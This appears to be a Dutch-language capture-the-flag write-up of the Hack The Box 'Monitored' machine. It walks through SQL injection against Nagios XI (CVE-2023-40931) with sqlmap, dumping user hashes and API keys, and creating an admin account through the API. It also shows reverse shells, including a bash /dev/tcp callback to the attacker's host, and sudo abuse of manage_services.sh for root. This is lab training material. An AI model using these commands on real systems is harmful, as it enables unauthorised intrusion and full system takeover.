# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌──(kali㉿kali)-[~/HTB/Monitored]
└─$ nmap -p- 10.129.230.96
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-01 12:30 CEST
Nmap scan report for 10.129.230.96
Host is up (0.029s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
389/tcp  open  ldap
443/tcp  open  https
5667/tcp open  unknown

┌──(kali㉿kali)-[~/HTB/Monitored]
└─$ nmap -sU 10.129.230.96
PORT    STATE SERVICE
123/udp open  ntp
161/udp open  snmp

```

### Detailed port scan

At the detailed port scan go to get more information from the services which are open on the ip address.

```
┌──(kali㉿kali)-[~/HTB/Monitored]
└─$ nmap -p22,80,389,443,5667 -sCV 10.129.230.96 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-01 12:31 CEST
Nmap scan report for 10.129.230.96
Host is up (0.031s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
80/tcp   open  http       Apache httpd 2.4.56
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
|_http-server-header: Apache/2.4.56 (Debian)
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
| Not valid before: 2023-11-11T21:46:55
|_Not valid after:  2297-08-25T21:46:55
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-title: Nagios XI
5667/tcp open  tcpwrapped
Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ik ben deze gaan toevoegen en ik ben gaan kijken naar de webpagina op poort 443. Hierbij kom je op de volgende pagina.

![[Pasted image 20250901123428.png]]

Als je zult gaan zien kunnen we niet veel meer doen dan gewoon naar de login page gaan en dit is het. Als je zult zien hebben we de snmp poort dat open is. We zullen de snmpwalk tool gaan gebruiken voor het zien of we geen interessante informatie kunnen vinden. And Guess what we hebben een interessant command-line gevonden.

```
sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB "
```

Wat dus wilt zeggen dat we login credentials hebbe gevonden. Ik zal deze een keer gaan gebruiken voor proberen in te loggen op de login page. Maar zoalsje kunt zien krijgen we de error message dat de user account disabled is of niet bestaat.

![[Pasted image 20250901135736.png]]

Als je gaat kijken naar het ffuf commando kan je zien dat er een api auth token is die je kan verkrijgen door het volgende commando te gebruiken.

```
┌──(kali㉿kali)-[~/HTB/Monitored]
└─$ ffuf -u https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -ac 403

license                 [Status: 200, Size: 34, Words: 3, Lines: 2, Duration: 852ms]
authenticate            [Status: 200, Size: 53, Words: 7, Lines: 2, Duration: 522ms]
```

```
┌──(kali㉿kali)-[~/HTB/Monitored]
└─$ curl -X POST 'http://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1' \
     -d "username=svc&password=XjH7VCehowpR1xZB&valid_min=4"
{
    "username": "svc",
    "user_id": "2",
    "auth_token": "8cb0028ad925da18123310a86e6cb3f8f43f7bfc",
    "valid_min": 4,
    "valid_until": "Mon, 01 Sep 2025 09:33:25 -0400"
}
```

Door gebruik te maken van deze token, kan je dit gaan toevoegen aan de url zoals de volgende url waarmee je zult kunnen inloggen. https://nagios.monitored.htb/nagiosxi/login.php?token=d677ff74a103ddd0bf817869a1f7046fbab73d86
Daarna wordt je ingelogd op de nagios page.

![[Pasted image 20250901165229.png]]

Hieronder kan je zien dat de webpage op version 5.11.0 draait. Ik zal nu gaan kijken of dat er geen exploits te vinden zijn. Hiervoor heb ik de volgende exploit gevonden. https://github.com/sealldeveloper/CVE-2023-40931-PoC. Als je de payload van in de exploit volgt zal je de volgende code moeten uitvoeren. I will only show the necessary data here below.

```
┌──(kali㉿kali)-[~/HTB/Monitored]
└─$ sqlmap -D nagiosxi -T xi_users -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=52886d7767559b762a1b04ff9bd8d3c229f9dca3`curl -ksX POST https://nagios.monitored.htb/nagiosxi -d "username=svc&password=XjH7VCehowpR1xZB&valid_min=4" | awk -F'"' '{print$12}'`" --dump --level 4 --risk 3 -p id --batch

──(kali㉿kali)-[~/HTB/Monitored]
└─$ cat /home/kali/.local/share/sqlmap/output/nagios.monitored.htb/dump/nagiosxi/xi_users.csv
user_id,email,name,api_key,enabled,password,username,created_by,last_login,api_enabled,last_edited,created_time,last_attempt,backend_ticket,last_edited_by,login_attempts,last_password_change
1,admin@monitored.htb,Nagios Administrator,IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL,1,$2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C,nagiosadmin,0,1701931372,1,1701427555,0,1756726671,IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0,5,6,1701427555
2,svc@monitored.htb,svc,2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK,0,$2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK,svc,1,1699724476,1,1699728200,1699634403,1756737994,6oWBPbarHY4vejimmu3K8tpZBNrdHpDgdUEs5P2PFZYpXSuIdrRMYgk66A0cjNjq,1,33,1699697433
```

Nu dat we de apikey hebben, zullen we deze gaan gebruiken door gebruik te maken van het curl POST commando. De gebruiker die ik aan zal maken zal ik de user test noemen en ik zal hem de admin rechten toekenen zodat deze een admin user is voor op de nagios page.

```
curl -k -X POST "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL" \ 
-d "username=test&password=test&name=test&email=test@Monitored.htb&auth_level=admin"
{"success":"User account test was added successfully!","user_id":6}
```

Nu dat ik de user test aan heb gemaakt, zal ik gaan inloggen met deze user op de webpage. Voor de connectie te maken met de server zal je het volgende path moeten volgen. Binnen dit path zal je een command gaan aanmaken waarbij je een rce commando zal gaan gebruiken als je de commando zult gaan runnen op de localhost. Het path is als volgt. Navigeer naar de Core Config Manager --> daarna zal je commands aan klikken en een new command gaan maken --> Het commando geef je een eigen naam en ik heb revshell gebruikt voor het Bash commando aan te maken. 

![[Pasted image 20250901204156.png]]

Eens de stappen gebeurd zijn zal je naar de Hosts gaan. Daar heb je een localhost en zal je deze gaan editen, dit door op onderstaande icon te klikken.

![[Pasted image 20250901204342.png]]

Bij het editen zal je in de Check command box je zo juist aan gemaakt commando gaan aanduiden.

![[Pasted image 20250901204448.png]]

Eens dat dit gedaan is zet je een listener op die op dezelfde poort draait als je poort in je commando zodat je de connectie kunt opzetten met de server. Daarna zal je helemaal onderaan de pagina het Run Check Command zien staan en zal je deze dus gaan uitvoeren. Zoals je hieronder kunt zien hebben we de connectie met de server kunnen maken. En hebben we nu dus de user flag kunnen bemachtigen.

```
┌──(kali㉿kali)-[~/HTB/Monitored]
└─$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.230.96 33060
bash: cannot set terminal process group (34105): Inappropriate ioctl for device
bash: no job control in this shell
nagios@monitored:~$ cat user.txt
cat user.txt
1cf59c517b5bc4c54d392d754a8900f7
nagios@monitored:~$
```

User flag: 1cf59c517b5bc4c54d392d754a8900f7

Ik ben het sudo -l commando gaan gebruiken zodat ik kan zien of er iets is dat ik kan uitvoeren als de root user zonder het sudo commando te moeten gebruiken.

```
nagios@monitored:~$ sudo -l
sudo -l
Matching Defaults entries for nagios on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nagios may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/npcd start
    (root) NOPASSWD: /etc/init.d/npcd stop
    (root) NOPASSWD: /etc/init.d/npcd restart
    (root) NOPASSWD: /etc/init.d/npcd reload
    (root) NOPASSWD: /etc/init.d/npcd status
    (root) NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
    (root) NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/migrate/migrate.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *

```

Zoals je hierboven kunt zien is er de commando "(root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
", We zullen de info die in de nagios file zit gaan kopieren naar een backup file zodat de data niet verloren gaat en binnen de nagios file gaan we de rce code zetten. Ik ben de rce code weer gaan halen van revshells.com en daar bash -i gebruikt voor de connectie. Je zal deze gaan toevoegen aan de nagios file door echo te gebruiken.

```
echo '#!/bin/bash

bash -i >& /dev/tcp/10.10.16.17/5555 0>&1' > nagios
```

Nu zullen we de file execute rechten gaan geven door chmod +x nagios te gebruiken.
Voor dat we het commando gaan uitvoeren, gaan we eerst gaan kijken in het manage_services.sh file en daar kan je het volgende zien wat ons zal helpen met het commando.

```
# Things you can do
first=("start" "stop" "restart" "status" "reload" "checkconfig" "enable" "disable")
second=("postgresql" "httpd" "mysqld" "nagios" "ndo2db" "npcd" "snmptt" "ntpd" "crond" "shellinaboxd" "snmptrapd" "php-fpm")
```

Ik zal dus de start parameter als eerst gaan meegeven (was een persoonlijke keuze. Ik heb dit ook geprobeerd met de restart of de reload maar die werkte niet voor mij) en daarna zullen we de nagios file erachter zetten omdat het de file is die moet worden uitgevoerd. We starten de listener op onze eigen machine en we hebben de connectie.

```
nagios@monitored:/usr/local/nagios/bin$ sudo /usr/local/nagiosxi/scripts/manage_services.sh start nagios

┌──(kali㉿kali)-[~/HTB/Monitored]
└─$ nc -lvnp 5555
Listening on 0.0.0.0 5555
Connection received on 10.129.230.96 43844
bash: cannot set terminal process group (40436): Inappropriate ioctl for device
bash: no job control in this shell
root@monitored:/#
```

Zoals je kunt zien hebben we een remote connection met de root user en kunnen we de root flag bemachtigen en is hierbij de root user rooted.

```
root@monitored:/# cat /root/root.txt
cat /root/root.txt
cb1544bb97b99ae01267b163de4e7cec
root@monitored:/#
```

![[Pasted image 20250901224924.png]]